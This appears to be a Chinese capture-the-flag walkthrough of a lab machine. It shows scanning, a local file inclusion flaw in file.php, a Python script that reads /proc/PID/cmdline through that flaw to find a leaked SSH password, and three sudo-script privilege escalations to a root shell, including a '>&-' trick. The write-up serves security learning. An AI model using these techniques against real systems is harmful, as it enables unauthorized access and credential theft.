---
title: "114"
date: 2026-01-19 15:32
categories: 学习
tags:
  - 学习
  - 渗透
author: DmcforSpc
---
  

先进行靶机的ip探测  
![](assets/img/attachments/QQ_1768803333970.png)  
  
ip: 192.168.36.45  
![](assets/img/attachments/QQ_1768803384312.png)   

nmap 扫一下看看有没有开放其他端口  
![](assets/img/attachments/QQ_1768803605474.png)   

正常端口22、80

扫一下目录  
![](assets/img/attachments/QQ_1768803762767.png)  

这里发现一个file.php文件，fuzz参数  
![](assets/img/attachments/QQ_1768803843299.png)  
![](assets/img/attachments/QQ_1768803891757.png)    

最后有个welcome用户，可以尝试直接读取flag  
`http://192.168.36.45/file.php?file=/home/welcome/user.txt`  
![](assets/img/attachments/QQ_1768803980033%201.png)    

下一步尝试获取shell  
先读取源码  
![](../../接单/9月/assets/img/attachments/QQ_1768804064783.png)  
```php
<?php
// file.php
$file = $_GET['file'];
echo file_get_contents($file);
?>

//这里看到file_get_contents尝试PHP Filter链攻击没成功
```

常规目录遍历读取没读取到有用的东西  
对PID进程读取  
```python
import requests

url = "http://192.168.36.45/file.php"
print("[*] Brute-forcing /proc/PID/cmdline to find hidden processes...")

# 扫描前 3000 个进程 ID (通常系统服务都在前面)
for pid in range(1, 3001):
    file_path = f"/proc/{pid}/cmdline"
    params = {'file': file_path}
    
    try:
        r = requests.get(url, params=params, timeout=1)
        # 过滤掉空的或者无关紧要的进程
        if len(r.content) > 0:
            # cmdline 通常包含不可见字符，替换掉以便阅读
            cmd = r.content.replace(b'\x00', b' ').decode('utf-8', errors='ignore')
            
            # 过滤掉常见的系统进程，只看重点
            useless = ["/sbin/init", "systemd", "kworker", "scsi", "usb", "xfs", "ext4"]
            if not any(x in cmd for x in useless):
                print(f"[PID {pid}] {cmd}")
                
    except Exception as e:
        pass

# 使用bp爆破工具也可以url/file.php?file=/proc/这里是爆破参数/cmdline
```

![](assets/img/attachments/QQ_1768804333974%201.png)   
这里发现PID 502的进程有 welcome 用户相关的密码，尝试ssh登录  
```
[PID 502] service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080 infinity 
```

![](assets/img/attachments/QQ_1768804453198.png)  

sudo -l 看一下是否有可以利用的文件  
![](assets/img/attachments/QQ_1768804485193.png)  

有两个脚本  
![](assets/img/attachments/QQ_1768804513102.png)  
```bash
#!/bin/bash

echo "Input the flag:"
if head -1 | grep -q "$(< /root/root.txt)"
then
        echo "Y"
else
        echo "N"
fi
```

```bash
#!/bin/bash

PATH=/usr/bin
My_guess=$RANDOM

echo "This is script logic"
cat << EOF
if [ "$1" != "$My_guess" ] ;then
    echo "Nop"; 
else
    bash -i;
fi
EOF

[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
```

这里有两种方法拿rootflag  
第一种通过short.sh脚本
脚本逻辑是随机数生成：My_guess=\$RANDOM。在 Bash 中，$RANDOM 生成一个 0 到 32767 之间的整数。
当输入的数等于他那个随机数，就会进入shell  
循环脚本  
```bash
while true; do sudo /opt/short.sh 1024; done
```
等待他自动跳到shell  
![](assets/img/attachments/QQ_1768805291001.png)  

第二种是通过read.sh脚本  
利用进程监控泄露敏感信息获取 Flag
当我们运行read.sh的时候会创建进程，并读取/root/root.txt放到进程里面，我们运行脚本后不关闭，然后去查看进程。  
**ai解析**
- **命令替换**：当 Bash 执行这一行时，它**首先**会执行 `$(< /root/root.txt)`，把 `/root/root.txt` 的内容读出来。
    
- **构建命令**：然后，它会构建完整的 `grep` 命令。假设 Flag 是 `flag{123}`，实际执行的命令就变成了： `grep -q "flag{123}"`
    
- **等待输入**：由于 `head -1` 正在等待你的键盘输入（标准输入），管道符后面的 `grep` 进程也会启动并**处于等待状态**。
    
- **信息暴露**：在 Linux 中，只要进程启动了，任何用户（只要 `/proc` 挂载属性没有特殊限制）都可以通过 `ps` 命令看到该进程的完整命令行参数。

```bash
sudo /opt/read.sh
ps -aux | grep grep
```
![](assets/img/attachments/QQ_1768805475064.png)  

还有一种群主提供的方法  
```bash
sudo /opt/short.sh '1' >&-
```
这里的核心在于末尾的 **`>&-`**。 在 Linux Shell 中，`>&-` 的意思是 **关闭标准输出 (Close Standard Output / STDOUT)**。

`/opt/short.sh` 的最后一行代码：
```Bash
[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
```

这是一个典型的 `A && B || C` 逻辑结构：
1. **A**: `[ "$1" != "$My_guess" ]`（判断猜测是否错误）
    
2. **B**: `echo "Nop"`（输出失败提示）
    
3. **C**: `bash -i`（开启 Root Shell）
	

正常情况（不加 `>&-`）：
1. 你输入 `'1'`，随机数是（例如）`24543`。
    
2. **A** 判断成立（不相等）。
    
3. 执行 **B** (`echo "Nop"`)。`echo` 成功把 "Nop" 打印到屏幕上，返回状态码 `0` (Success)。
    
4. 因为 B 成功了，根据 `&& ... ||` 的逻辑，**C (`bash -i`) 被跳过**。
    
5. 脚本结束。
	

加了 `>&-`：
1. 你输入 `'1'`，随机数是 `24543`。
    
2. **A** 判断成立。
    
3. 执行 **B** (`echo "Nop"`)。
    
    - **关键点**：此时标准输出（STDOUT）已经被你关闭了。
        
    - `echo` 尝试往一个**已关闭**的文件描述符里写字。
        
    - **`echo` 报错失败！**（虽然你看不到报错，因为输出关了，但它的返回状态码变成了 `1` 或其他非零值）。
        
4. 因为 B **失败**了，Shell 会继续寻找下一个逻辑分支。
    
5. 逻辑变成了：`A (真) && B (失败) || C`。
    
6. 触发 **||** 分支，执行 **C (`bash -i`)**。
    
7. **Boom! Root Shell 启动！**

标准输出关掉了，需要恢复完整shell   
```
/bin/bash -i >&2 2>&2
```
![](assets/img/attachments/QQ_1768805762148.png)   

